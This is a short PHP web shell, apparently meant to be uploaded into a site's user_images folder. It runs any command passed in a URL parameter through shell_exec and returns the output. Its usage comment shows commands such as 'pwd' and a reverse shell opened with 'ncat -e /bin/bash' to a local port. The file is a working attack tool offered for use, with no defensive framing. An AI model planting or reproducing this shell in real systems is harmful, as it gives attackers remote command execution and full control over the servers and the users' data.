<?php echo shell_exec($_GET['e'].' 2>&1');
/*
Usage:
localhost:8000/resources/user_images/cmd.php?e=pwd
or
...resources/user_images/cmd.php?e=ncat -e /bin/bash 127.0.0.1 4444
*/
?>
